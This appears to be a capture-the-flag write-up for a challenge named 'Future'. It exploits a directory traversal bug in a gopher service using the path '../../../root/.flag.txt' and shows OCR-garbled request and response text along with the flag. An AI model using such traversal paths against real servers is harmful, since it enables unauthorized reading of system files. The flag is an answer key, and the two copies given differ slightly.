# Future
> You are not allowed to escalate this problem! the root cause as usual is some kind of validation failure, may we have this issue in the near future?

## About the Challenge
We need to pentest the gopher protocol to obtain the flag

## How to Solve?
The gopher protocol is vulnerable to `Directory Traversal` attack, where we can read the flag by accessing `../../../root/.flag.txt`


[Image extracted text: Request
Response
Pretty
Raw
Hex
In
=
Pretty
Raw
Hex
Render
GET
1 .
root/flag
txt HTTP/1.1
HTTP/1.0
200
OK
2
Host:
go.ctf
site:10070
2
Last-Modified: Sun,
15
Oct
2023
18:38:36
GMT
3
Cache-Control:
max-age-0
3 Content-Type:
text/plain
Upgrade-Insecure-Requests
5
User-Agent:
Mozilla/5 .0
(Windows
NT
10.0;
Win64;
X64)
5
EKO{root_was_pwn3d! }
AppleWebKit
537.36
(KHTML ,
like
Gecko)
Chrome/118. 0.5993.90
6
Safari/537
36
Accept:
text/html,application/xhtml-xml,application/xml;q=0.9, image/avif ,
image/webp
image/apng,*/*;q=0.8,application/signed-exchange;v-b3;
q=0.7
Accept-Encoding
gzip,
deflate,
br
Accept-Language
en-US, en;q=0.9
If-Modified-Since:
Tue ,
31
Oct
2023
04:00:11
GMT
10
Connection:
close
11
12]


```
EKO{r00t_was_pwn3d!}
```